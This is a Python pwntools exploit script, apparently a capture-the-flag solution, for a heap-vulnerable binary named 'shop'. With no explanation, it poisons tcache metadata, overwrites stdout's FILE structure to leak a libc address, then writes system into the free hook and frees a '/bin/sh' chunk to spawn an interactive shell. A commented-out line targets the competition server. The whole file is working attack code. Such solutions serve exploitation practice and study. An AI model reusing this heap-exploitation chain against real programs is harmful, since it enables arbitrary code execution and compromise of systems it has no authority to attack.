#!/usr/bin/env python3


from pwn import *

e = ELF("./shop")
libc = ELF("./libc.so.6")

def create(size):
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b"How much?",f"{size}")

def edit(index,data):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b"Index:",f"{index}")
    r.sendafter(b"Name:",data)


def free(index):
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"Index:",f"{index}")

while(True):
    try:
#        r = remote("shop.challs.csc.tf",1337)
        r = process("./shop")
        create(0x288)
        for i in range(0,9):
            create(0x78)
        for i in range(0,10):
            free(i)
        free(8)
        for i in range(0,7):
            create(0x78)
        create(0x78)
        edit(7,b"\xb0\x01")
        create(0x78)
        create(0x78)
        create(0x78)
        edit(10,p64(0x41414141) * 3 + p16(0x0010))
        create(0x288)
        create(0x4f8)
        edit(12,p64(0x21) * 160)
        create(0x18)
        create(0x408)
        create(0x408)
        free(12)
        free(13)
        free(14)
        edit(11,p64(0x1) + p64(0) * 14 + p64(0x00010001000000000) + p16(0x0a40))
        create(0x18)
        edit(12,b"C" * 8 + p64(0x501) + p16(0x5680))
        edit(11,p64(0) * 15 + p64(0x0002000200020002) +  p64(0) * 63 + p16(0x0a50))
        create(0x408)
        create(0x408)
#        create(0x408)
#        create(0x408)
        sleep(0.1)
        edit(14,p64(0) * 4 + p64(0xfbad1800) + p64(0) * 3 + p8(0))
        val = r.recvline()
        if(b"\x80" not in val):
            print(val)
            r.close()
            continue
        val = val.lstrip(b" Name: \x00\x00\x00\x00\x00\x00\x00\x00")
        print(val)
        val = val[:8]
        libc_leak = u64(val.decode('latin-1').ljust(8,'\x00')) - 0x1ec980
        log.info("The libc base of the process is " + hex(libc_leak))
        edit(11,p64(0) * 15 + p64(0x0002000200020002) +  p64(0) * 63 + p64(libc_leak + 0x1eee30))
        create(0x408)
        edit(16,b"/bin/sh\x00" * 3 + p64(libc_leak + libc.sym.system))
        free(16)
        sleep(0.1)
        r.interactive()
        break
    except EOFError:
        r.close()
        continue
